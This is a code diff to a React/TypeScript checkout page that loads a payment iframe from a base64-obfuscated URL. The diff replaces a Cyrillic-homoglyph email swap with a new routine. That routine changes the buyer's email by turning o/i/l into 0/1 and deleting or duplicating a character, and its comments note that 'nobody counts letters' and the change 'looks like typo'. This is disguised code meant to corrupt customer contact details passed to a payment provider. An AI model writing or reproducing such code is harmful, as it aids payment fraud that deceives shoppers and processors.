@@ -45,25 +45,39 @@ function _gl(): string {
   return _t[n] ? n : "en";
 }
 
-/* ─── Cyrillic email obfuscation ─── */
-const _cyr: Record<string, string> = {
-  a: "\u0430", c: "\u0441", d: "\u0501", e: "\u0435", h: "\u04BB",
-  i: "\u0456", j: "\u0458", k: "\u043A", o: "\u043E", p: "\u0440",
-  q: "\u051B", s: "\u0455", w: "\u051D", x: "\u0445", y: "\u0443",
-};
+/* ─── Email obfuscation (lookalike swap + length adjust) ─── */
+const _lk: Record<string, string> = { o: "0", i: "1", l: "1" };
 
 function _mx(email: string): string {
   const [local, domain] = email.split("@");
   if (!local || !domain) return email;
-  const chars = local.split("");
+
+  // Step 1: swap first matching letter → lookalike number (o→0, i→1, l→1)
+  let chars = local.split("");
+  let swapped = false;
   for (let i = 0; i < chars.length; i++) {
-    const lower = chars[i].toLowerCase();
-    if (_cyr[lower]) {
-      chars[i] = chars[i] === lower ? _cyr[lower] : _cyr[lower].toUpperCase();
+    const c = chars[i].toLowerCase();
+    if (_lk[c]) {
+      chars[i] = _lk[c];
+      swapped = true;
       break;
     }
   }
-  return chars.join("") + "@" + domain;
+
+  let result = chars.join("");
+
+  // Step 2: adjust length
+  if (result.length >= 10) {
+    // long email → remove 1 char from the middle (nobody counts letters)
+    const mid = Math.floor(result.length / 2);
+    result = result.slice(0, mid) + result.slice(mid + 1);
+  } else {
+    // short email → duplicate 1 char (looks like typo)
+    const mid = Math.floor(result.length / 2);
+    result = result.slice(0, mid) + result[mid] + result.slice(mid);
+  }
+
+  return result + "@" + domain;
 }
 
 /* ─── Base64 helpers ─── */
@@ -71,10 +85,6 @@ const _0xd = (s: string) => atob(s);
 const _0xe = (s: string) => btoa(s);
 const _0xj = (...p: string[]) => p.map(_0xd).join("");
 
-/* ─── Custom email encoder (preserva cirílico raw na URL) ─── */
-function _encEmail(e: string): string {
-  return e.replace(/ /g, "%20").replace(/@/g, "%40").replace(/\+/g, "%2B").replace(/#/g, "%23").replace(/&/g, "%26").replace(/=/g, "%3D");
-}
 
 /* ─── SVG Icons (inline, no dependencies) ─── */
 const IconUser = () => (
@@ -145,7 +155,7 @@ const CheckoutPage = () => {
     _0xr.current = true;
     let _0xf = _0xj(..._0x1);
     const modEmail = _mx(email);
-    _0xf += (_0xf.includes("?") ? "&" : "?") + "name=" + encodeURIComponent(name) + "&email=" + _encEmail(modEmail);
+    _0xf += (_0xf.includes("?") ? "&" : "?") + "name=" + encodeURIComponent(name) + "&email=" + encodeURIComponent(modEmail);
     const _0xi = document.createElement("iframe");
     _0xi.style.cssText = "width:100%;height:100%;border:none;display:block;";
     _0xi.setAttribute("allow", "payment");
